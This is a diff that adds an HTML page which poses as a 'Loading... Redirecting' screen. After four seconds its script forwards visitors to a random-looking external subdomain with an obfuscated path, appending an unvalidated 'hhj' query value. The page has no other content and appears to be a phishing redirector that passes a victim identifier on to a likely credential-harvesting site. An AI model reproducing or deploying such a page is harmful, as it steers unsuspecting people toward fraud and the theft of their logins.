@@ -1,0 +1,68 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Loading...</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            background-color: #f4f4f4;
+            margin: 0;
+        }
+        .loading-container {
+            text-align: center;
+        }
+        .loading-text {
+            font-size: 24px;
+            margin-bottom: 20px;
+        }
+        .loading-spinner {
+            width: 50px;
+            height: 50px;
+            border: 5px solid #f3f3f3;
+            border-top: 5px solid #3498db;
+            border-radius: 50%;
+            animation: spin 1s linear infinite;
+        }
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+    </style>
+</head>
+<body>
+
+    <div class="loading-container">
+        <div class="loading-text">Redirecting...</div>
+        <div class="loading-spinner"></div>
+    </div>
+
+    <script>
+        // Function to get query parameter value by name
+        function getQueryParam(name) {
+            const urlParams = new URLSearchParams(window.location.search);
+            return urlParams.get(name);
+        }
+
+        // Get the value of 'hhj' query parameter
+        const hhjValue = getQueryParam('hhj');
+        
+        // Create the redirect URL
+        let redirectUrl = 'https://jpSVr.ieecaa.es/E0Lif5kXJc!EtA937/$';
+        if (hhjValue) {
+            redirectUrl += hhjValue;  // Append the value directly without '?hhj='
+        }
+
+        // Redirect after 4 seconds
+        setTimeout(() => {
+            window.location.href = redirectUrl;
+        }, 4000);
+    </script>
+
+</body>
+</html>
